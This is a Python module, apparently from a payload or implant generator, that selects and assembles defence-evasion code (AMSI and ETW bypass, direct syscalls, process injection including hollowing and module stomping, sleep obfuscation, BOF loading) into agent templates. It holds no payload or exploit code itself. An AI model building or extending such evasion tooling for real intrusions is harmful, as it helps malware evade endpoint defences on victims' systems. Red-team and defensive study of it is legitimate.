from __future__ import annotations

import importlib
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class EvasionConfig:
    amsi: bool = False
    etw: bool = False
    syscalls: Optional[str] = None       # None | 'direct' | 'indirect'
    inject: Optional[str] = None         # None | 'createthread' | 'apc' | 'hollowing' | 'stomp'
    inject_target: Optional[str] = None
    sleep_obf: Optional[str] = None      # None | 'ekko' | 'foliage'
    idle_encrypt: int = 30
    profile: str = "default"
    bof: bool = False


FEATURE_LANG_SUPPORT: dict[str, tuple[str, ...]] = {
    "amsi": ("python", "powershell"),
    "etw": ("python", "powershell"),
    "syscalls": ("python", "powershell"),
    "injection": ("python", "powershell"),
    "sleep_obf": ("python", "powershell"),
    "crypto": ("python", "powershell", "javascript", "vbscript"),
    "profiles": ("python", "powershell", "javascript", "vbscript"),
    "bof_loader": ("python",),
}

_PLACEHOLDER_MAP: dict[str, str] = {
    "crypto": "EVASION_CRYPTO",
    "amsi": "EVASION_AMSI",
    "etw": "EVASION_ETW",
    "syscalls": "EVASION_SYSCALLS",
    "injection": "EVASION_INJECT",
    "sleep_obf": "EVASION_SLEEP",
    "profiles": "TRANSPORT_BLOCK",
    "bof_loader": "EVASION_BOF",
}


def get_evasion_code(feature: str, lang: str, config: EvasionConfig) -> str:
    """Lazily import evasion.<feature> and return generated code for the given language."""
    if lang not in FEATURE_LANG_SUPPORT.get(feature, ()):
        return ""
    module = importlib.import_module(f"evasion.{feature}")
    return module.generate_code(lang, config)


def get_all_evasion_code(lang: str, config: EvasionConfig) -> dict[str, str]:
    """Return a dict mapping placeholder names to generated code for all enabled features."""
    result: dict[str, str] = {}

    # crypto is always enabled
    code = get_evasion_code("crypto", lang, config)
    if code:
        result[_PLACEHOLDER_MAP["crypto"]] = code

    # profiles/transport is always enabled (driven by config.profile)
    code = get_evasion_code("profiles", lang, config)
    if code:
        result[_PLACEHOLDER_MAP["profiles"]] = code

    # conditional features
    if config.amsi:
        code = get_evasion_code("amsi", lang, config)
        if code:
            result[_PLACEHOLDER_MAP["amsi"]] = code

    if config.etw:
        code = get_evasion_code("etw", lang, config)
        if code:
            result[_PLACEHOLDER_MAP["etw"]] = code

    if config.syscalls is not None:
        code = get_evasion_code("syscalls", lang, config)
        if code:
            result[_PLACEHOLDER_MAP["syscalls"]] = code

    if config.inject is not None:
        code = get_evasion_code("injection", lang, config)
        if code:
            result[_PLACEHOLDER_MAP["injection"]] = code

    if config.sleep_obf is not None:
        code = get_evasion_code("sleep_obf", lang, config)
        if code:
            result[_PLACEHOLDER_MAP["sleep_obf"]] = code

    if config.bof:
        code = get_evasion_code("bof_loader", lang, config)
        if code:
            result[_PLACEHOLDER_MAP["bof_loader"]] = code

    return result
